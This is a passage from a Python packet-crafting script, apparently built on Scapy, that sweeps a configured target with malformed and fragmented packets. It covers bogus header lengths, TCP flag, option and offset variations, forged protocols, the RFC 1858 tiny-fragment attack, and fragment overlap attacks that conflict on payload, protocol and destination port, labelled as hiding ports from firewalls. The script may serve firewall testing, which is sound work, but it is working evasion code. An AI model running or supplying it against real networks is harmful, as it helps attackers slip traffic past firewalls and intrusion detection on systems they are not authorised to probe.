print(f"  TCP options         : {enable_tcp_options}")
print(f"  TCP data offset     : {enable_tcp_dataofs}")
print(f"  TCP urgent pointer  : {enable_tcp_urgptr}")
print(f"  IP options (S5)     : {enable_ip_options}")
print(f"  IP IHL bogus        : {enable_ihl}")
print("="*100)

def skip(sec, reason="disabled"):
    print("\n" + "="*100)
    print(f"  {sec} — SKIPPED ({reason})")
    print("="*100)

# ================================================================
#  SECTION 1: WHITELIST PROTOCOL SWEEP
# ================================================================
if not enable_section1_whitelist:
    skip("SECTION 1: WHITELIST SWEEP")
else:
    print("\n" + "="*100)
    print("  SECTION 1: WHITELIST PROTOCOL SWEEP")
    print("  Each attack type runs completely before the next")
    print("="*100)

    # ── 1-1: PLAIN PACKET SWEEP (non-frag) ──────────────────────
    if not _frag_enabled:
        print("\n  [1-1] PLAIN PACKET SWEEP")
        for proto_num,proto_name in whitelist_protocols.items():
            for pname in payload_pattern_names:
                for size in payload_size_list:
                    pay = gen_payload(pname, size)
                    for ttl in ttl_list:
                        for tos in tos_list:
                            for ip_id in get_ip_id():
                                pkt=make_ip(target,ttl,tos,proto_num,ip_id=ip_id)/Raw(pay)
                                send_pkt(proto_num,f"{proto_name}-{pname}-{size}B","plain","-",pkt)

        # ── 1-2: IP OPTIONS PLAIN SWEEP ─────────────────────────
        if enable_ip_options:
            print("\n  [1-2] IP OPTIONS PLAIN SWEEP")
            for opt_name,opt_value in ip_options_list.items():
                for proto_num,proto_name in whitelist_protocols.items():
                    for pname in payload_pattern_names:
                        for size in payload_size_list:
                            pay = gen_payload(pname, size)
                            for ttl in ttl_list:
                                for tos in tos_list:
                                    for ip_id in get_ip_id():
                                        pkt=make_ip_with_options(target,ttl,tos,proto_num,
                                                    opt_value,ip_id=ip_id)/Raw(pay)
                                        send_pkt(proto_num,f"{proto_name}-{opt_name}-{pname}-{size}B",
                                                 f"opt={opt_name}","-",pkt)

        # ── 1-3: TCP FLAG SWEEP (plain) ─────────────────────────
        if enable_tcp_flags:
            print("\n  [1-3] TCP FLAG SWEEP (plain)")
            for flg in tcp_flag_list:
                for ttl in ttl_list:
                    for tos in tos_list:
                        for ip_id in get_ip_id():
                            pkt=make_ip(target,ttl,tos,6,ip_id=ip_id)/TCP(flags=flg)
                            send_pkt("TCP",f"flags={flg}","tcp-flag","-",pkt)

        # ── 1-4: TCP DATA OFFSET SWEEP (plain) ──────────────────
        if enable_tcp_dataofs:
            print("\n  [1-4] TCP DATA OFFSET SWEEP (plain)")
            for dofs in tcp_dataofs_list:
                for ttl in ttl_list:
                    for tos in tos_list:
                        for ip_id in get_ip_id():
                            t=build_tcp_advanced(dataofs=dofs)
                            pkt=make_ip(target,ttl,tos,6,ip_id=ip_id)/t
                            send_pkt("TCP",f"dataofs={dofs}","tcp-dataofs","-",pkt)

        # ── 1-5: TCP URGENT POINTER SWEEP (plain) ───────────────
        if enable_tcp_urgptr:
            print("\n  [1-5] TCP URGENT POINTER SWEEP (plain)")
            for urg in tcp_urgptr_list:
                for ttl in ttl_list:
                    for tos in tos_list:
                        for ip_id in get_ip_id():
                            t=build_tcp_advanced(flags="U",urgptr=urg)
                            pkt=make_ip(target,ttl,tos,6,ip_id=ip_id)/t
                            send_pkt("TCP",f"urgptr={urg}","tcp-urgptr","-",pkt)

        # ── 1-6: TCP OPTIONS SWEEP (plain) ──────────────────────
        if enable_tcp_options:
            print("\n  [1-6] TCP OPTIONS SWEEP (plain)")
            for i,opts in enumerate(tcp_options_list):
                for ttl in ttl_list:
                    for tos in tos_list:
                        for ip_id in get_ip_id():
                            try:
                                t=build_tcp_advanced(options=opts)
                                pkt=make_ip(target,ttl,tos,6,ip_id=ip_id)/t
                                send_pkt("TCP",f"opts[{i}]","tcp-opts","-",pkt)
                            except Exception as e:
                                send_pkt("TCP",f"opts[{i}]-ERR","tcp-opts","-",
                                         make_ip(target,ttl,tos,6,ip_id=ip_id)/TCP())

        # ── 1-7: IHL BOGUS SWEEP (plain) ────────────────────────
        if enable_ihl:
            print("\n  [1-7] IHL BOGUS SWEEP (plain)")
            for proto_num,proto_name in whitelist_protocols.items():
                for ihl_val in ihl_list:
                    for ttl in ttl_list:
                        for tos in tos_list:
                            for ip_id in get_ip_id():
                                pkt=make_ip_ihl(target,ttl,tos,proto_num,
                                                ihl=ihl_val,ip_id=ip_id)/Raw(b"\x41"*20)
                                send_pkt(proto_num,f"{proto_name}-ihl={ihl_val}","ihl-bogus","-",pkt)

        # ── 1-8: BOGUS LENGTH SWEEP (plain) ─────────────────────
        if enable_bogus_length:
            print("\n  [1-8] BOGUS LENGTH SWEEP (plain)")
            for proto_num,proto_name in whitelist_protocols.items():
                for blen,blabel in bogus_length_list:
                    for ttl in ttl_list:
                        for tos in tos_list:
                            for ip_id in get_ip_id():
                                try:
                                    if proto_num==6:
                                        # TCP: no length field — inject bogus dataofs via raw struct
                                        import struct as _struct
                                        dofs_nibble = (blen & 0xF) << 4
                                        raw_tcp = _struct.pack("!HHIIHHHH",
                                            1234, 80, 0, 0,
                                            (dofs_nibble << 8) | 0x02,  # SYN flag
                                            65535, 0, 0)
                                        inner = Raw(load=raw_tcp + b"\x41"*8)
                                        tag = f"TCP-dataofs={blen}({blabel})"
                                    elif proto_num==17:
                                        blen_safe = blen & 0xFFFF   # wrap to 16-bit
                                        inner = UDP(len=RawVal(blen_safe))/Raw(b"\x41"*8)
                                        tag = f"UDP-len={blen}({blabel})"
                                    else:
                                        inner = Raw(b"\x41"*8)
                                        tag = f"{proto_name}-bogus={blen}({blabel})"
                                    pkt = make_ip(target,ttl,tos,proto_num,ip_id=ip_id)/inner
                                    send_pkt("BL", tag, "bogus-len", "-", pkt)
                                except Exception as e:
                                    send_pkt("BL",f"{proto_name}-err","bogus-len","-",
                                             make_ip(target,ttl,tos,proto_num,ip_id=ip_id)/Raw(b"\x41"*8))

    else:
        # ── 1-A: FRAGMENT PAYLOAD SWEEP ─────────────────────────
        print("\n  [1-A] FRAGMENT PAYLOAD SWEEP")
        for proto_num,proto_name in whitelist_protocols.items():
            for fsize in fragment_size_list:
                for pname in payload_pattern_names:
                    pay = gen_payload(pname, fsize*2)
                    for ttl in ttl_list:
                        for tos in tos_list:
                            for ip_id in get_ip_id():
                                frags=fragment(make_ip(target,ttl,tos,proto_num,ip_id=ip_id)/
                                               Raw(pay), fragsize=fsize)
                                send_frags(frags, f"{proto_name}-{pname}-{fsize}B")

        # ── 1-B: IP OPTIONS FRAGMENT SWEEP ──────────────────────
        if enable_ip_options:
            print("\n  [1-B] IP OPTIONS FRAGMENT SWEEP")
            for opt_name,opt_value in ip_options_list.items():
                for proto_num,proto_name in whitelist_protocols.items():
                    for fsize in fragment_size_list:
                        for pname in payload_pattern_names:
                            pay = gen_payload(pname, fsize*2)
                            for ttl in ttl_list:
                                for tos in tos_list:
                                    for ip_id in get_ip_id():
                                        try:
                                            frags=fragment(
                                                make_ip_with_options(target,ttl,tos,proto_num,
                                                           opt_value,ip_id=ip_id)/Raw(pay),
                                                fragsize=fsize)
                                            send_frags(frags,f"{proto_name}-{opt_name}-{pname}-{fsize}B")
                                        except Exception as e:
                                            print(f"  ERROR: {e}")

        # ── 1-C: TCP FLAG FRAGMENT SWEEP ────────────────────────
        if enable_tcp_flags:
            print("\n  [1-C] TCP FLAG FRAGMENT SWEEP")
            for flg in tcp_flag_list:
                for ttl in ttl_list:
                    for tos in tos_list:
                        for ip_id in get_ip_id():
                            payload=bytes(TCP(flags=flg))+b"\x41"*32
                            frags=fragment(make_ip(target,ttl,tos,6,ip_id=ip_id)/
                                           Raw(payload),fragsize=32)
                            send_frags(frags, f"TCP-flags={flg}")

# ================================================================
#  SECTION 2: FORGED PROTOCOL SWEEP
# ================================================================
if not enable_section2_forged:
    skip("SECTION 2: FORGED PROTOCOL SWEEP")
else:
    print("\n" + "="*100)
    print("  SECTION 2: FORGED PROTOCOL — Fragment Size Sweep")
    print("="*100)
    for frag_mode in fragment_mode_list:
        for proto_num,proto_name in forged_protocols.items():
            for tos in tos_list:
                for ttl in ttl_list:
                    for ip_id in get_ip_id():
                        id_tag = f"id={hex(ip_id)}" if ip_id else "id=auto"
                        print(f"\n  [Mode={frag_mode}|{proto_name}|ToS={hex(tos)}|TTL={ttl}|{id_tag}]")
                        print_header()
                        if frag_mode == "NoFragment":
                            pkt=make_ip(target,ttl,tos,proto_num,ip_id=ip_id)/Raw(b"\x42"*64)
                            send_pkt(proto_num,f"{proto_name}-plain","plain","-",pkt)
                        else:
                            for fsize in fragment_size_list:
                                for pname in payload_pattern_names:
                                    pay = gen_payload(pname, fsize*2)
                                    frags=fragment(make_ip(target,ttl,tos,proto_num,ip_id=ip_id)/
                                                   Raw(pay), fragsize=fsize)
                                    send_frags(frags, f"{proto_name}-{pname}-{fsize}B")

# ================================================================
#  SECTION 3: TINY FRAGMENT ATTACK (RFC 1858)
#  No separate on/off flag needed:
#  → Controlled by fragment_mode_list and fragment_size_list
#  → "Fragment" in fragment_mode_list = fragment attacks enabled
#  → fragsize=8 in fragment_size_list = tiny fragment covered
#    (Section 1 already sends 8-byte fragments for all whitelist protos)
#
#  This section sends the CLASSIC RFC 1858 form specifically:
#    F1 = 8 bytes (too small to contain dest port — firewall cannot inspect)
#    F2 = port hidden at byte offset 8 (firewall misses it)
#  → Only runs when "Fragment" is in fragment_mode_list
# ================================================================
print("\n" + "="*100)
if not _frag_enabled:
    print("  SECTION 3: TINY FRAGMENT ATTACK (RFC 1858) — SKIPPED")
    print("  Reason: enable_fragment = False")
    print("  To enable: set enable_fragment = True in ON/OFF SWITCHES")
    print("="*100)
else:
    print("  SECTION 3: TINY FRAGMENT ATTACK (RFC 1858)")
    print("  F1=8B (no port visible) | F2=port hidden at offset 8B")
    print("  Controlled by: fragment_mode_list + fragment_size_list")
    print("  (fragsize=8 in Section 1 also covers tiny fragment sweep)")
    print("="*100)
    for proto_num,proto_name in whitelist_protocols.items():
        for ttl in ttl_list:
            for tos in tos_list:
                for ip_id in get_ip_id():
                    id_tag = f"id={hex(ip_id)}" if ip_id else "id=auto"
                    print(f"\n  [{proto_name}|TTL={ttl}|ToS={hex(tos)}|{id_tag}]")
                    print_header()
                    # F1: 8 bytes — sport only, no dport visible to firewall
                    f1=make_ip(target,ttl,tos,proto_num,ip_id=ip_id,flags="MF",frag=0)/Raw(b"\x00"*8)
                    # F2: offset=8B — dport=80 starts here (hidden from firewall)
                    f2=make_ip(target,ttl,tos,proto_num,ip_id=ip_id,flags=0,frag=1)/Raw(b"\x00\x50\x00\x50"+b"\x00"*4)
                    send_frags([f1,f2], f"{proto_name}-TinyFrag-RFC1858")

# ================================================================
#  SECTION 4A: PAYLOAD OVERLAP
#  OS send order decides first/last policy for overlap zone
# ================================================================
if not enable_payload_overlap:
    skip("SECTION 4A: PAYLOAD OVERLAP", "enable_payload_overlap=False")
else:
    print("\n" + "="*100)
    print("  SECTION 4A: PAYLOAD OVERLAP")
    print(f"  ip_payload_overlap  : {enable_ip_payload_overlap}   — IP layer fragment overlap attack")
    print(f"  tcp_payload_overlap : {enable_tcp_payload_overlap}  — TCP layer fragment overlap attack")
    print(f"  ip_plain_payload    : {enable_ip_plain_payload}   — IP plain payload sweep (non-frag)")
    print(f"  tcp_plain_payload   : {enable_tcp_plain_payload}  — TCP plain payload sweep (non-frag)")
    print(f"  overlap pairs       : {len(overlap_pairs)} (auto from payload_patterns)")
    print("="*100)

    if _frag_enabled:
        # ── Fragment mode: IP layer payload overlap ──────────────
        if enable_ip_payload_overlap:
            print("\n  [4A-IP-OVERLAP: IP layer fragment payload conflict]")
            for olabel,(pay1,pay2) in overlap_pairs.items():
                for ttl in ttl_list:
                    for tos in tos_list:
                        for ip_id in get_ip_id():
                            id_tag = f"id={hex(ip_id)}" if ip_id else "id=auto"
                            print(f"\n  [IP-Ovlp|{olabel}|TTL={ttl}|ToS={hex(tos)}|{id_tag}]")
                            print(f"  F1[8:12]={pay1[8:12].hex()} | F2[8:12]={pay2[8:12].hex()} | conflict={pay1[8:16]!=pay2[8:16]}")
                            print_header()
                            b1,b2=pay1[:48],pay2[:48]
                            # IP layer: proto=1 (ICMP), pure IP payload overlap
                            f1=make_ip(target,ttl,tos,1,ip_id=ip_id,flags="MF",frag=0)/Raw(b1[:16])
                            f2=make_ip(target,ttl,tos,1,ip_id=ip_id,flags="MF",frag=1)/Raw(b2[8:24])
                            f3=make_ip(target,ttl,tos,1,ip_id=ip_id,flags=0,   frag=2)/Raw(b2[16:32])
                            send_frags([f1,f2,f3], f"IP-{olabel}")
        else:
            print("\n  [4A-IP-OVERLAP] SKIPPED (enable_ip_payload_overlap=False)")

        # ── Fragment mode: TCP layer payload overlap ─────────────
        if enable_tcp_payload_overlap:
            print("\n  [4A-TCP-OVERLAP: TCP layer fragment payload conflict]")
            for olabel,(pay1,pay2) in overlap_pairs.items():
                for ttl in ttl_list:
                    for tos in tos_list:
                        for ip_id in get_ip_id():
                            id_tag = f"id={hex(ip_id)}" if ip_id else "id=auto"
                            print(f"\n  [TCP-Ovlp|{olabel}|TTL={ttl}|ToS={hex(tos)}|{id_tag}]")
                            print(f"  F1[8:12]={pay1[8:12].hex()} | F2[8:12]={pay2[8:12].hex()} | conflict={pay1[8:16]!=pay2[8:16]}")
                            print_header()
                            b1,b2=pay1[:48],pay2[:48]
                            # TCP layer: proto=6, TCP header + payload overlap
                            tcp_hdr = bytes(TCP(sport=1234,dport=80,flags="S"))[:20]
                            f1=make_ip(target,ttl,tos,6,ip_id=ip_id,flags="MF",frag=0)/Raw(tcp_hdr+b1[:16])
                            f2=make_ip(target,ttl,tos,6,ip_id=ip_id,flags="MF",frag=1)/Raw(b2[8:24])
                            f3=make_ip(target,ttl,tos,6,ip_id=ip_id,flags=0,   frag=2)/Raw(b2[16:32])
                            send_frags([f1,f2,f3], f"TCP-{olabel}")
        else:
            print("\n  [4A-TCP-OVERLAP] SKIPPED (enable_tcp_payload_overlap=False)")

    else:
        # ── Non-fragment: IP plain payload sweep ─────────────────
        # Matrix: payload_pattern_names × payload_size_list × whitelist_protocols
        if enable_ip_plain_payload:
            print("\n  [4A-IP-PLAIN: IP protocol plain payload sweep]")
            print(f"  patterns={payload_pattern_names} × sizes={payload_size_list}")
            for pname in payload_pattern_names:
                for size in payload_size_list:
                    pay = gen_payload(pname, size)
                    for pnum,proto_name in whitelist_protocols.items():
                        for ttl in ttl_list:
                            for tos in tos_list:
                                for ip_id in get_ip_id():
                                    id_tag = f"id={hex(ip_id)}" if ip_id else "id=auto"
                                    print(f"\n  [IP-Plain|{proto_name}|{pname}|{size}B|TTL={ttl}|ToS={hex(tos)}|{id_tag}]")
                                    print_header()
                                    pkt = make_ip(target,ttl,tos,pnum,ip_id=ip_id)/Raw(pay)
                                    send_pkt(pnum,f"{proto_name}-{pname}-{size}B","ip-plain","-",pkt)
        else:
            print("\n  [4A-IP-PLAIN] SKIPPED (enable_ip_plain_payload=False)")

        # ── Non-fragment: TCP plain payload sweep ────────────────
        # Matrix: payload_pattern_names × payload_size_list
        if enable_tcp_plain_payload:
            print("\n  [4A-TCP-PLAIN: TCP payload plain sweep]")
            print(f"  patterns={payload_pattern_names} × sizes={payload_size_list}")
            for pname in payload_pattern_names:
                for size in payload_size_list:
                    pay = gen_payload(pname, size)
                    for ttl in ttl_list:
                        for tos in tos_list:
                            for ip_id in get_ip_id():
                                id_tag = f"id={hex(ip_id)}" if ip_id else "id=auto"
                                print(f"\n  [TCP-Plain|{pname}|{size}B|TTL={ttl}|ToS={hex(tos)}|{id_tag}]")
                                print_header()
                                pkt = make_ip(target,ttl,tos,6,ip_id=ip_id)/\
                                      TCP(sport=1234,dport=80,flags="S")/Raw(pay)
                                send_pkt(6,f"TCP-{pname}-{size}B","tcp-plain","-",pkt)
        else:
            print("\n  [4A-TCP-PLAIN] SKIPPED (enable_tcp_plain_payload=False)")

# ================================================================
#  SECTION 4B: PROTOCOL OVERLAP
#  OS send order decides which proto field reassembler uses
# ================================================================
if not enable_proto_overlap:
    skip("SECTION 4B: PROTOCOL OVERLAP", "enable_proto_overlap=False")
else:
    print("\n" + "="*100)
    print(f"  SECTION 4B: PROTOCOL OVERLAP — {len(proto_overlap_pairs)} pairs (whitelist x forged)")
    print("  Fragment mode  → OS order decides which proto field wins at reassembly")
    print("  NoFragment mode→ plain sweep per whitelist_protocols (auto)")
    print("="*100)
    for plabel,(p1,p1n,p2,p2n) in proto_overlap_pairs.items():
        for ttl in ttl_list:
            for tos in tos_list:
                for ip_id in get_ip_id():
                    id_tag = f"id={hex(ip_id)}" if ip_id else "id=auto"
                    print(f"\n  [{plabel}|F1={p1n}({p1})|F2={p2n}({p2})|TTL={ttl}|{id_tag}]")
                    print_header()
                    b1,b2=b"\x41"*48,b"\x42"*48

                    if not _frag_enabled:
                        # NoFragment: send each whitelist proto as plain packet (baseline)
                        if enable_nofrag_proto_sweep:
                            for pnum,pname in whitelist_protocols.items():
                                pkt=make_ip(target,ttl,tos,pnum,ip_id=ip_id)/Raw(b1[:32])
                                send_pkt(pnum,f"{plabel}-{pname}-plain","nofrag-plain","-",pkt)
                        else:
                            print("  [NoFragment+nofrag_proto_sweep=False → skipped]")
                    else:
                        f1=make_ip(target,ttl,tos,p1,ip_id=ip_id,flags="MF",frag=0)/Raw(b1[:16])
                        f2=make_ip(target,ttl,tos,p2,ip_id=ip_id,flags="MF",frag=1)/Raw(b2[8:24])
                        f3=make_ip(target,ttl,tos,p2,ip_id=ip_id,flags=0,   frag=2)/Raw(b2[16:32])
                        send_frags([f1,f2,f3], plabel)

# ================================================================
#  SECTION 4C: PORT OVERLAP
#  OS send order decides which dport reassembler uses
# ================================================================
if not enable_port_overlap:
    skip("SECTION 4C: PORT OVERLAP", "enable_port_overlap=False")
else:
    # Build port_transport_list for NoFragment case too
    if not _frag_enabled or not hasattr(sys.modules[__name__], 'port_transport_list') or 'port_transport_list' not in dir():
        if port_overlap_transport == "all":
            port_transport_list = list(l4_port_protocols.items())
        else:
            port_transport_list = [(k,v) for k,v in l4_port_protocols.items()
                                   if v == port_overlap_transport]
        if port_overlap_pairs is None:
            port_overlap_pairs = {}
            for wp,fp in product(whitelist_ports, forged_ports):
                port_overlap_pairs[f"p{wp}_vs_p{fp}"] = (wp,fp)

    print("\n" + "="*100)
    print(f"  SECTION 4C: PORT OVERLAP — {len(port_overlap_pairs)} pairs | transport={port_overlap_transport}")
    print("  Fragment mode  → OS order decides which dport wins at reassembly")
    print("  NoFragment mode→ plain packet per whitelist_protocols with each port pair (enable_nofrag_proto_sweep)")
    print(f"  whitelist_ports={whitelist_ports}")
    print(f"  forged_ports   ={forged_ports}")
    print("="*100)
    for proto_num,proto_name in port_transport_list:
        for portlabel,(dp1,dp2) in port_overlap_pairs.items():
            for ttl in ttl_list:
                for tos in tos_list:
                    for ip_id in get_ip_id():
                        id_tag = f"id={hex(ip_id)}" if ip_id else "id=auto"
                        print(f"\n  [{proto_name}|{portlabel}|F1.dp={dp1}|F2.dp={dp2}|TTL={ttl}|{id_tag}]")
                        print_header()
                        h1=build_l4_hdr(proto_num,dport=dp1)
                        h2=build_l4_hdr(proto_num,dport=dp2)

                        if not _frag_enabled:
                            # NoFragment: send each whitelist proto + both ports as plain
                            if enable_nofrag_proto_sweep:
                                for pnum,pname in whitelist_protocols.items():
                                    ph1=build_l4_hdr(pnum,dport=dp1)
                                    ph2=build_l4_hdr(pnum,dport=dp2)
                                    pkt1=make_ip(target,ttl,tos,pnum,ip_id=ip_id)/Raw(ph1)
                                    pkt2=make_ip(target,ttl,tos,pnum,ip_id=ip_id)/Raw(ph2)
                                    send_pkt(pnum,f"{pname}-dp{dp1}","nofrag-p1","-",pkt1)
                                    send_pkt(pnum,f"{pname}-dp{dp2}","nofrag-p2","-",pkt2)
                            else:
                                print("  [NoFragment+nofrag_proto_sweep=False → skipped]")
                        else:
                            f1=make_ip(target,ttl,tos,proto_num,ip_id=ip_id,flags="MF",frag=0)/Raw(h1)
                            f2=make_ip(target,ttl,tos,proto_num,ip_id=ip_id,flags=0,   frag=0)/Raw(h2)
                            send_frags([f1,f2], f"{proto_name}-{portlabel}")

# Section 5 removed — IP options merged into Section 1 (1-2 plain / 1-B fragment)
